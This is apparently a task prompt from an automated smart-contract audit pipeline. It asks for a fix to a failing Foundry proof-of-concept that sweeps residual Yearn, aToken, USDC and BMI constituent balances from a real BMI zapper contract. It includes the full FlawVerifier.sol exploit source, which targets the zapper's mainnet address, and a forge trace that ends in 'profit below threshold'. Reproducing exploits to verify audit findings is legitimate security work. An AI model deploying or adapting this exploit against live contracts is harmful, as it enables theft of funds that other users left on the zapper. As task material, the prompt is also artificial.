You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Derivative unwinds and mint accounting use whole-contract balances instead of the current zap's deltas
- claim: Multiple paths process the zapper's entire holdings rather than the amount attributable to the current caller. Yearn inputs call `withdraw()` with no share amount, Yearn-CRV paths forward `IERC20(crvToken).balanceOf(address(this))` and then `IERC20(USDC).balanceOf(address(this))`, Aave withdrawals use `type(uint256).max`, and the mint helpers repeatedly read `balanceOf(address(this))` for primitives and BMI constituents. Any residual derivative, primitive, or constituent tokens already sitting on the zapper are therefore pulled into the current caller's mint/refund flow.
- impact: A later caller can permissionlessly capture assets left on the zapper from prior users, accidental transfers, failed integrations, or unrefunded dust. This enables direct theft of contract-held Yearn shares, aTokens, Curve LP tokens, USDC, and BMI constituent tokens.
- exploit_paths: ["Residual `yUSDC` or `yCRV` shares exist on the zapper; an attacker submits a dust zap with the same token; `withdraw()` at lines 270/282 unwraps the entire share balance and the resulting assets are minted into BMI for the attacker.", "Residual `aUSDC` exists on the zapper; an attacker calls `zapToBMI` with a dust `aUSDC` amount; `withdraw(_fromUnderlying, type(uint256).max, ...)` at line 310 redeems the full aToken position and converts it for the attacker.", "Residual USDC or supported BMI constituents remain on the zapper; any later zap reaches lines 326/434/454/489/533/556/571/581 and folds those whole balances into the new caller's mint/refund outcome."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface IYearn {
    function pricePerShare() external view returns (uint256);
}

interface ICurvePool {
    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
}

interface IBasket {
    function getOne() external view returns (address[] memory, uint256[] memory);
    function getAssetsAndBalances() external view returns (address[] memory, uint256[] memory);
}

interface IBMIZapper {
    function BMI() external view returns (address);

    function calcUSDCEquilavent(address _from, uint256 _amount) external view returns (uint256);

    function zapToBMI(
        address _from,
        uint256 _amount,
        address _fromUnderlying,
        uint256 _fromUnderlyingAmount,
        uint256 _minBMIRecv,
        address[] calldata _bmiConstituents,
        uint256[] calldata _bmiConstituentsWeightings,
        address _aggregator,
        bytes calldata _aggregatorData,
        bool refundDust
    ) external returns (uint256);
}

contract FlawVerifier {
    address internal constant TARGET = 0x4622aFF8E521A444C9301dA0efD05f6b482221b8;

    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant yUSDC = 0x5f18C75AbDAe578b483E5F43f12a39cF75b973a9;
    address internal constant ySUSD = 0xa5cA62D95D24A4a350983D5B8ac4EB8638887396;
    address internal constant yCRV = 0x4B5BfD52124784745c1071dcB244C6688d2533d3;
    address internal constant ycrvSUSD = 0x5a770DbD3Ee6bAF2802D29a901Ef11501C44797A;
    address internal constant ycrvYBUSD = 0x8ee57c05741aA9DB947A744E713C15d4d19D8822;
    address internal constant ycrvBUSD = 0x6Ede7F19df5df6EF23bD5B9CeDb651580Bdf56Ca;
    address internal constant ycrvUSDP = 0xC4dAf3b5e2A9e93861c3FBDd25f1e943B8D87417;
    address internal constant ycrvFRAX = 0xB4AdA607B9d6b2c9Ee07A275e9616B84AC560139;
    address internal constant ycrvALUSD = 0xA74d4B67b3368E83797a35382AFB776bAAE4F5C8;
    address internal constant ycrvLUSD = 0x5fA5B62c8AF877CB37031e0a3B2f34A78e3C56A6;
    address internal constant ycrvUSDN = 0x3B96d491f067912D18563d56858Ba7d6EC67a6fa;
    address internal constant ycrvIB = 0x27b7b1ad7288079A66d12350c828D3C00A6F07d7;
    address internal constant ycrvThree = 0x84E13785B5a27879921D6F685f041421C7F482dA;
    address internal constant ycrvDUSD = 0x30FCf7c6cDfC46eC237783D94Fc78553E79d4E9C;
    address internal constant ycrvMUSD = 0x8cc94ccd0f3841a468184aCA3Cc478D2148E1757;
    address internal constant ycrvUST = 0x1C6a9783F812b3Af3aBbf7de64c3cD7CC7D1af44;
    address internal constant aUSDC = 0xBcca60bB61934080951369a648Fb03DF4F96263C;

    address internal constant crvSUSDPool = 0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;

    IBMIZapper internal constant ZAPPER = IBMIZapper(TARGET);

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        address bmi = ZAPPER.BMI();
        uint256 startUSDC = IERC20(USDC).balanceOf(address(this));
        uint256 startBMI = IERC20(bmi).balanceOf(address(this));

        (address[] memory constituents, uint256[] memory weightings) = _buildWeightings(bmi);
        if (constituents.length == 0 || constituents.length != weightings.length) {
            _setProfit(startUSDC, startBMI, bmi);
            return;
        }

        // Path 1: residual yUSDC exists on the zapper; a zero-amount call preserves the same
        // exploit causality because the vulnerable branch still calls withdraw() with no share amount.
        if (_balanceOf(yUSDC, TARGET) > 0) {
            _attemptZap(yUSDC, USDC, constituents, weightings);
        }

        // Path 2: residual yCRV exists on the zapper; the branch unwraps the entire zapper balance,
        // then forwards whole-contract CRV and USDC balances into mint/refund accounting.
        if (_balanceOf(yCRV, TARGET) > 0) {
            _attemptZap(yCRV, USDC, constituents, weightings);
        }

        // Path 3: residual aUSDC exists on the zapper; the Aave branch withdraws type(uint256).max.
        if (_balanceOf(aUSDC, TARGET) > 0) {
            _attemptZap(aUSDC, USDC, constituents, weightings);
        }

        // Path 4: residual USDC or residual supported BMI constituents remain on the zapper.
        // A zero-amount primitive USDC call still reaches the whole-balance mint/refund code paths.
        // If the fork only has isolated non-refundable constituent dust and no complementary assets,
        // the target can still revert deeper in mint(0); that is a concrete fork-state infeasibility,
        // so this verifier contains the attempt in a non-fatal low-level call.
        if (_balanceOf(USDC, TARGET) > 0 || _hasResidualConstituent(constituents)) {
            _attemptZap(USDC, USDC, constituents, weightings);
        }

        _setProfit(startUSDC, startBMI, bmi);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptZap(
        address from,
        address fromUnderlying,
        address[] memory constituents,
        uint256[] memory weightings
    ) internal {
        // Keep per-branch failures non-fatal so executeOnOpportunity can probe every documented path
        // against live fork balances without masking which preconditions are actually absent.
        (bool ok, ) = TARGET.call(
            abi.encodeWithSelector(
                IBMIZapper.zapToBMI.selector,
                from,
                0,
                fromUnderlying,
                0,
                0,
                constituents,
                weightings,
                address(0),
                bytes(""),
                true
            )
        );
        ok;
    }

    function _buildWeightings(address bmi) internal view returns (address[] memory assets, uint256[] memory weightings) {
        uint256[] memory one;

        try IBasket(bmi).getOne() returns (address[] memory _assets, uint256[] memory _one) {
            assets = _assets;
            one = _one;
        } catch {
            try IBasket(bmi).getAssetsAndBalances() returns (address[] memory _assets, uint256[] memory _balances) {
                assets = _assets;
                one = _balances;
            } catch {
                return (assets, weightings);
            }
        }

        if (assets.length == 0 || assets.length != one.length) {
            return (assets, weightings);
        }

        weightings = new uint256[](assets.length);
        uint256[] memory usdcQuotes = new uint256[](assets.length);
        uint256 totalQuote;

        for (uint256 i = 0; i < assets.length; ++i) {
            usdcQuotes[i] = _quoteUSDC(assets[i], one[i]);
            totalQuote += usdcQuotes[i];
        }

        if (totalQuote == 0) {
            uint256 equalWeight = 1e18 / assets.length;
            uint256 acc;
            for (uint256 i = 0; i + 1 < assets.length; ++i) {
                weightings[i] = equalWeight;
                acc += equalWeight;
            }
            weightings[assets.length - 1] = 1e18 - acc;
            return (assets, weightings);
        }

        uint256 sumWeights;
        for (uint256 i = 0; i + 1 < assets.length; ++i) {
            uint256 w = (usdcQuotes[i] * 1e18) / totalQuote;
            weightings[i] = w;
            sumWeights += w;
        }
        weightings[assets.length - 1] = 1e18 - sumWeights;
    }

    function _quoteUSDC(address asset, uint256 amount) internal view returns (uint256) {
        if (amount == 0) {
            return 0;
        }

        if (asset == ySUSD) {
            uint256 underlying = (amount * IYearn(asset).pricePerShare()) / 1e18;
            return ICurvePool(crvSUSDPool).get_dy(3, 1, underlying);
        }

        if (_isYearnCRV(asset)) {
            try ZAPPER.calcUSDCEquilavent(asset, amount) returns (uint256 quoted) {
                return quoted;
            } catch {
                return 0;
            }
        }

        return _normalizeToUSDC(asset, amount);
    }

    function _normalizeToUSDC(address asset, uint256 amount) internal view returns (uint256) {
        uint8 decimals;
        try IERC20(asset).decimals() returns (uint8 d) {
            decimals = d;
        } catch {
            return 0;
        }

        if (decimals == 6) {
            return amount;
        }
        if (decimals > 6) {
            return amount / (10 ** (decimals - 6));
        }
        return amount * (10 ** (6 - decimals));
    }

    function _hasResidualConstituent(address[] memory constituents) internal view returns (bool) {
        for (uint256 i = 0; i < constituents.length; ++i) {
            if (_balanceOf(constituents[i], TARGET) > 0) {
                return true;
            }
        }
        return false;
    }

    function _setProfit(uint256 startUSDC, uint256 startBMI, address bmi) internal {
        uint256 endUSDC = IERC20(USDC).balanceOf(address(this));
        if (endUSDC > startUSDC) {
            _profitToken = USDC;
            _profitAmount = endUSDC - startUSDC;
            return;
        }

        uint256 endBMI = IERC20(bmi).balanceOf(address(this));
        if (endBMI > startBMI) {
            _profitToken = bmi;
            _profitAmount = endBMI - startBMI;
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        try IERC20(token).balanceOf(account) returns (uint256 bal) {
            return bal;
        } catch {
            return 0;
        }
    }

    function _isYearnCRV(address token) internal pure returns (bool) {
        return token == yCRV ||
            token == ycrvSUSD ||
            token == ycrvYBUSD ||
            token == ycrvBUSD ||
            token == ycrvUSDP ||
            token == ycrvFRAX ||
            token == ycrvALUSD ||
            token == ycrvLUSD ||
            token == ycrvUSDN ||
            token == ycrvIB ||
            token == ycrvThree ||
            token == ycrvDUSD ||
            token == ycrvMUSD ||
            token == ycrvUST;
    }
}

```

forge stdout (tail):
```
387FF6C7E::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [23608] 0xBcca60bB61934080951369a648Fb03DF4F96263C::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [staticcall]
    │   │   ├─ [18497] 0x1C050bCa8BAbe53Ef769d0d2e411f556e1a27E7B::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [delegatecall]
    │   │   │   ├─ [12878] 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9::d15e0053(000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48) [staticcall]
    │   │   │   │   ├─ [7767] 0x085E34722e04567Df9E6d2c32e82fd74f3342e79::d15e0053(000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003a3b56a785b1cc1546a2c6a
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003a3b56a785b1cc1546a2c6a
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [3339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [staticcall]
    │   │   ├─ [2553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [4951] 0x27b7b1ad7288079A66d12350c828D3C00A6F07d7::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [staticcall]
    │   │   ├─ [4382] 0x986b4AFF588a109c09B50A03f42E4110E29D353F::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [4071] 0xB4AdA607B9d6b2c9Ee07A275e9616B84AC560139::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [staticcall]
    │   │   ├─ [3899] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [4071] 0x3B96d491f067912D18563d56858Ba7d6EC67a6fa::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [staticcall]
    │   │   ├─ [3899] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [4071] 0xA74d4B67b3368E83797a35382AFB776bAAE4F5C8::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [staticcall]
    │   │   ├─ [3899] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [4071] 0x1C6a9783F812b3Af3aBbf7de64c3cD7CC7D1af44::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [staticcall]
    │   │   ├─ [3899] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [4071] 0x5fA5B62c8AF877CB37031e0a3B2f34A78e3C56A6::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [staticcall]
    │   │   ├─ [3899] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [4071] 0x5a770DbD3Ee6bAF2802D29a901Ef11501C44797A::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [staticcall]
    │   │   ├─ [3899] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [4071] 0xC4dAf3b5e2A9e93861c3FBDd25f1e943B8D87417::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [staticcall]
    │   │   ├─ [3899] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::balanceOf(0x4622aFF8E521A444C9301dA0efD05f6b482221b8) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1107] 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [598] 0xE2792dBAa268631A3858BF831b76baFC1A8a4362::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [293] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2289] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 106.70s (104.13s CPU time)

Ran 1 test suite in 106.71s (106.70s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 1442875)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
